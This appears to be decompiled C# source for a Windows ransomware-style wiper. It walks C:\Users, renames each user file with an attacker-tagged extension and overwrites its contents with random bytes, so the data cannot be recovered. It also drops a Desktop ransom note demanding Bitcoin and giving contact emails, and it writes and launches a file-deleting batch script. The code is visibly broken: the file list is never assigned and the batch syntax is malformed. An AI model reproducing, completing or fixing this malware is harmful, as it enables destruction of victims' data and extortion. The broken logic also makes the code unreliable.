using System;
using System.Diagnostics;
using System.IO;

namespace ConsoleApp2;

internal class Program
{
	private static void Main(string[] args)
	{
		string p = "C:\\Users";
		Search(p);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		StreamWriter streamWriter = File.CreateText(Path.Combine(folderPath, "FILES ENCRYPTED.TXT"));
		streamWriter.Write("All your files have been encrypted!\nAll your files have been encrypted due to a security problem with your PC. If you want to restore them, write us to the e-mail supportdata@cock.li\nWrite this ID in the title of your message 1E192D2A\nIn case of no answer in 24 hours write us to theese e-mails:xmmh@tutanota.com\nYou have to pay for decryption in Bitcoins. The price depends on how fast you write to us. After payment we will send you the decryption tool that will decrypt all your files. \nFree decryption as guarantee\nBefore paying you can send us up to 1 file for free decryption. The total size of files must be less than 1Mb (non archived), and files should not contain valuable information. (databases,backups, large excel sheets, etc.) \nHow to obtain Bitcoins\nThe easiest way to buy bitcoins is LocalBitcoins site. You have to register, click 'Buy bitcoins', and select the seller by payment method and price. \nhttps://localbitcoins.com/buy_bitcoins \nAlso you can find other places to buy Bitcoins and beginners guide here: \nHow Can I Buy Bitcoin?\n \nAttention!\nDo not rename encrypted files. \nDo not try to decrypt your data using third party software, it may cause permanent data loss. \nDecryption of your files with the help of third parties may cause increased price (they add their fee to our) or you can become a victim of a scam.");
		streamWriter.Close();
		StreamWriter streamWriter2 = File.CreateText(Path.Combine(folderPath, "FILES ENCRYPTED.bat"));
		streamWriter2.Write(":NA\nif exist % 1 goto DA\ngoto Fin\n:DA\ndel / f / s / q %1\ngoto NA\n:Fin\n");
		streamWriter2.Close();
		Process.Start(Path.Combine(folderPath, "FILES ENCRYPTED.bat"), Path.Combine(folderPath, "IS_room_start"));
	}

	private static void Search(string p)
	{
		string[] array = null;
		try
		{
			Directory.GetFiles(p);
		}
		catch
		{
		}
		if (array != null)
		{
			string[] array2 = array;
			foreach (string text in array2)
			{
				string text2 = Path.GetExtension(text)!.ToLower().Replace(".", "");
				if (text2 != "exe" && text2 != "bat" && text2 != "com" && text2 != "sys" && text2 != "dll" && text2 != "avi" && text2 != "msi" && text2 != "bin" && text2 != "lnk" && text2 != "html")
				{
					Hash(text);
				}
			}
		}
		string[] array3 = null;
		try
		{
			array3 = Directory.GetDirectories(p);
		}
		catch
		{
		}
		if (array3 == null)
		{
			return;
		}
		string[] array4 = array3;
		foreach (string text3 in array4)
		{
			string text4 = Path.GetFileName(text3)!.ToLower();
			if (text4 != "program files" && text4 != "program files (x86)" && text4 != "programdata" && text4 != "windows")
			{
				Search(text3);
			}
		}
	}

	private static void Hash(string f)
	{
		Random random = new Random(DateTime.Now.Millisecond);
		byte[] array = File.ReadAllBytes(f);
		byte[] array2 = new byte[array.Length];
		random.NextBytes(array2);
		string text = Path.Combine(Path.GetDirectoryName(f), Path.GetFileName(f) + ".id-1E192D2A.[xmmh@tutanota.com].combo13");
		try
		{
			File.Move(f, text);
			FileInfo fileInfo = new FileInfo(text);
			if (fileInfo.IsReadOnly)
			{
				fileInfo.IsReadOnly = false;
			}
			File.WriteAllBytes(text, array2);
		}
		catch
		{
		}
	}
}
